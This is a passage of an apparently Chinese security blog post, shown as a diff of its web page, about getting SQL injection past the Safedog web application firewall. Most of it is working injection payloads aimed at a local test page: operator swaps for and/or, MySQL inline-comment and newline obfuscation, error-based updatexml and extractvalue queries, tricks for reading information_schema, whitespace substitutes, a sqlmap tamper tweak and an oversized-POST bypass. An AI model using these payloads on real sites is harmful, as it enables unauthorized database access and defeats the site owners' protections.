+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and  1	拦截
+</span></span><span class="line"><span class="cl">and  &#39;1&#39;    拦截  
+</span></span><span class="line"><span class="cl">and  a	不拦截 
+</span></span><span class="line"><span class="cl">and  &#39;a&#39;    拦截  
+</span></span><span class="line"><span class="cl">and  !	不拦截 
+</span></span><span class="line"><span class="cl">and  1+1    拦截  
+</span></span><span class="line"><span class="cl">and  1+a    拦截  
+</span></span><span class="line"><span class="cl">and  hex(1)  不拦截
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路</p>
+<ul>
+<li>用其他字符替换 and 或者 or</li>
+<li>带入的不是字符串和数字型，带入一个特殊符号</li>
+<li></li>
+</ul>
+<p>针对第一种我们可以去看看运算符号 随便找到几个| ^ xor &amp; / * &amp;&amp; || 等等还有很多</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">与运算 a &amp; b  , 
+</span></span><span class="line"><span class="cl">或运算 a | b ,  
+</span></span><span class="line"><span class="cl">异或运算 a ^ b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
+    </a></figure></p>
+<p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;   ||(1) %23 		//使用括号代替空格绕过
+</span></span><span class="line"><span class="cl">//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;  xor 1%23			
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;  xor true%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="绕过order-by查询" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87order-by%e6%9f%a5%e8%af%a2" class="header-mark"></a>绕过order by查询</h2><p>判断查询字段,使用mysql的<code>/*!*/</code>内敛注释去绕过防护,而其中的代码是可以正常执行的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
+    </a></figure></p>
+<h2 id="绕过union-select查询" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87union-select%e6%9f%a5%e8%af%a2" class="header-mark"></a>绕过union select查询</h2><p>使用union xxx页面正常
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
+    </a></figure></p>
+<p>但是用union和select放在在一起就被发现啦
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
+    </a></figure></p>
+<p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
+    </a></figure></p>
+<ul>
+<li>对于数字型注入,可以将其转换成浮点型</li>
+<li>联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,</li>
+<li>函数中可以插入任何混淆字符绕过waf</li>
+<li>另外使用-1可以省去空格绕过waf</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
+    </a></figure></p>
+<p>基于报错信息的注入绕安全狗</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
+</span></span><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="绕过select-from" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87select-from" class="header-mark"></a>绕过select from</h2><p>使用大括号去绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
+    </a></figure></p>
+<p>使用反引号去绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用\N去绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>括号法去绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以组合起来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这些都是去掉空格的合法语句,当然如果不拦截<code>/*/或/!*/</code>的话,也可以尝试这两个</p>
+<blockquote>
+<p>提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。</p>
+</blockquote>
+<p>补充点
+php+mysql环境下支持的空格有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中使用的最多的就是<code>%0a,%0b,%a0,/**/</code>，这四个当作空格插入在语句中来扰乱waf检测。
+干货分享：使用<code>/^!$asd%2a–=/</code>代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的<code>/*/换成/^!$asd%2a–=*/</code>即可使用sqlmap跑了。</p>
+<h2 id="缓冲区溢出绕waf" class="headerLink">
+    <a href="#%e7%bc%93%e5%86%b2%e5%8c%ba%e6%ba%a2%e5%87%ba%e7%bb%95waf" class="header-mark"></a>缓冲区溢出绕waf</h2><p>另外也可以对安全狗实行缓冲区溢出绕waf
+缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过
+要求是(针对于安全狗而已):
+GET类型请求转换成POST类型
+Content-Length头长度大于4008
+正常参数放置在脏数据后面</p>
+<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
+        <img
+            
+            loading="lazy"
+            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png"
+            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png 2x"
+            sizes="auto"
+            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
+    </a></figure></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-12-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/waf/">Waf</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/" class="next" rel="next" title="给表弟的Web安全入门建议">给表弟的Web安全入门建议<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2015 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.bysec.cn/" target="_blank" rel="noopener noreferrer">bysec</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"twemoji":true};</script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
